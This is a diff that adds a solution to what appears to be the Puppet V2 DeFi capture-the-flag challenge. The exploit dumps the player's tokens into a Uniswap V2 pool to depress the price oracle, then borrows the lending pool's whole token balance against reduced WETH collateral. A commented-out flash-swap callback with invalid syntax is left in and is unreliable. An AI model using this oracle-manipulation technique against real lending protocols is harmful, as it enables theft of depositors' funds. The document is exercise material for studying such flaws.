@@ -98,8 +98,36 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uint256 amountOfEth = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE, 0, path, address(player), block.timestamp * 2
+        );
+        amountOfEth = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        weth.deposit{value: amountOfEth}();
+        weth.approve(address(lendingPool), amountOfEth);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        /*
+        require(sender == player, "Not the correct sender");
+        require(msg.sender == address(uniswapV2Exchange), "Only uniswapV2Exchange can call this function");
+        uint256 amountBorrowed = amount0 > 0 ? amount0 : amount1;
+        weth.deposit{msg.value: amountBorrowed}();
+        weth.approve(address(lendingPool), amountBorrowed);
+        lendingPool.borrow(amountBorrowed);
+        uint256 fee = (amountBorrowed * 3) / 997 + 1;
+        uint256 amountToRepay = amountBorrowed + fee;
+        weth.transfer(address(lendingPool), amountToRepay);
+        */
+    }
+
+    receive() external payable {}
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
